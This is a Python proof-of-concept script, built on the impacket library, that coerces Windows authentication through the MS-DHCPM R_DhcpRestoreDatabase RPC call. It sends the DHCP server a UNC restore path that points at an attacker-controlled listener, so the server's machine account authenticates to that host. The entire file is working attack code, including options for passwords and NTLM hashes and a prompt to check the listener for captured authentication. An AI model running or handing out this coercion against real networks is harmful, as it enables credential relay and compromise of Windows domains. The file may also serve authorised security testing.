#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proof of concept for coercing authentication with MS-DHCPM::R_DhcpRestoreDatabase() (opnum 45).
#
# R_DhcpRestoreDatabase restores the DHCP database from the directory named by Path; the server
# reads the backup from Path with no UNC validation ([MS-DHCPM] 3.2.4.46), so a UNC Path coerces the
# DHCP server (machine account) to authenticate to the listener. Like R_DhcpBackupDatabase (opnum
# 44), it lives on the *dhcpsrv2* interface (5b821720-f63b-11d0-aad2-00c04fc324db), NOT dhcpsrv
# (6bffd098-...), and is reached over ncacn_ip_tcp (endpoint mapper); the DHCP service exposes no
# named pipe on current Windows. Requires DHCP Administrators.
import sys, argparse
from impacket import system_errors
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import LPWSTR, WSTR, NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin

DHCPSRV2 = ('5b821720-f63b-11d0-aad2-00c04fc324db', '1.0')

class DCERPCSessionError(DCERPCException):
    def __str__(self):
        k = self.error_code
        if k in system_errors.ERROR_MESSAGES:
            s, v = system_errors.ERROR_MESSAGES[k]
            return 'SessionError: code: 0x%x - %s - %s' % (k, s, v)
        return 'SessionError: unknown error code: 0x%x' % k

class R_DhcpRestoreDatabase(NDRCALL):
    opnum = 45
    structure = (
        ('ServerIpAddress', LPWSTR),  # [in, unique, string] DHCP_SRV_HANDLE (unused by server)
        ('Path', WSTR),               # [in, string] LPWSTR
    )

class R_DhcpRestoreDatabaseResponse(NDRCALL):
    structure = ()

if __name__ == '__main__':
    print("Windows auth coerce using MS-DHCPM::R_DhcpRestoreDatabase()\n")
    p = argparse.ArgumentParser(add_help=True, description="Coerce via MS-DHCPM::R_DhcpRestoreDatabase()")
    p.add_argument("-u", "--username", default="")
    p.add_argument("-p", "--password", default="")
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--hashes", action="store", metavar="[LM]:NT")
    p.add_argument("--share", default="share", help="share component of the UNC restore path")
    p.add_argument("listener", help="listener the target should authenticate to")
    p.add_argument("target", help="target DHCP server")
    o = p.parse_args()
    lm, nt = ('', '')
    if o.hashes:
        lm, nt = o.hashes.split(':')

    print("[>] Resolving dhcpsrv2 endpoint on %s via the endpoint mapper ..." % o.target)
    sb = epm.hept_map(o.target, uuidtup_to_bin(DHCPSRV2), protocol='ncacn_ip_tcp')
    rt = transport.DCERPCTransportFactory(sb)
    if hasattr(rt, 'set_credentials'):
        rt.set_credentials(o.username, o.password, o.domain, lm, nt)
    dce = rt.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    print("[>] Connecting to %s ..." % sb)
    dce.connect()
    dce.bind(uuidtup_to_bin(DHCPSRV2))
    print("[>] Bound dhcpsrv2, calling R_DhcpRestoreDatabase() ...")
    req = R_DhcpRestoreDatabase()
    req['ServerIpAddress'] = NULL
    req['Path'] = ('\\\\%s\\%s\\dhcprestore' % (o.listener, o.share)) + '\x00'
    try:
        dce.request(req)
        print("[+] returned success, check your listener.")
    except Exception as e:
        # A non-success status is expected (the restore source is not a valid DHCP backup),
        # but the machine account has already authenticated to the listener (the coercion).
        print("[i] returned: %s" % e)
        print("[i] The call was processed by the target, check your listener.")
    sys.exit()
